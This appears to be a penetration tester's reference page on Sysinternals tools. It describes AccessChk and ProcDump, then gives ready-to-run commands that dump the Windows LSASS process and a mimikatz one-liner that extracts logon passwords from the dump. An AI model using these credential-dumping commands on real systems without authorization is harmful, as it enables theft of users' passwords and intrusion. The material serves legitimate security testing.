---
description: >-
  PsTools is a suite of tools developed by Sysinternals (now Microsoft). They're
  a great complement to any pen test, and many of my Nmap scripts are loosely
  based on them.
---

# psTools / Sysinternals

### AccessChk

As a part of ensuring that they've created a secure environment Windows administrators often need to know what kind of accesses specific users or groups have to resources including files, directories, Registry keys, global objects and Windows services. AccessChk quickly answers these questions with an intuitive interface and output.

### procdump

ProcDump is a command-line utility whose primary purpose is monitoring an application for CPU spikes and generating crash dumps during a spike that an administrator or developer can use to determine the cause of the spike. ProcDump also includes hung window monitoring \(using the same definition of a window hang that Windows and Task Manager use\), unhandled exception monitoring and can generate dumps based on the values of system performance counters. It also can serve as a general process dump utility that you can embed in other scripts. 

**Dump LSASS** 

32bit:

`procdump.exe -accepteula -ma lsass.exe c:\windows\temp\lsass.dmp` 

64bit:

`procdump.exe -accepteula -ma -64 lsass.exe lsass.dmp`

Mimikatz can be used offline in order to read the contents of the LSASS dump and especially sections that contain logon passwords. 

`mimikatz.exe log "sekurlsa::minidump lsass.dmp" sekurlsa::logonPasswords exit` 

